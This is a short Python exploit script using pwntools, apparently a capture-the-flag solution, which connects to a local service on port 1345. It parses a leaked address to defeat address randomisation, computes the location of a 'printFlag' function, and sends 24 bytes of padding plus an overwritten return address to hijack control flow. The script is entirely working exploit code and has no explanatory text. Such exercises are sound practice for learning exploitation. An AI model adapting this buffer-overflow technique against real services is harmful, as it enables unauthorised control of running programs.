#!/usr/bin/env python3

from pwn import *

#elf = ELF('./server')
#p = elf.process()

host="localhost"
port=1345

process = remote(host, port)

start_offset = 0x00000000000012da
printFlag_offset = 0x0000000000001255

address_sentence = process.recv().decode().split('\n')[-3]
given_start_address = address_sentence.split('0x')[-1]

printFlag_address = int(given_start_address,16) - start_offset + printFlag_offset

buffer_size = 24

payload = [
    b'A' * buffer_size,
    p64(printFlag_address)
]

payload = b''.join(payload)

process.sendline(payload)

process.interactive()
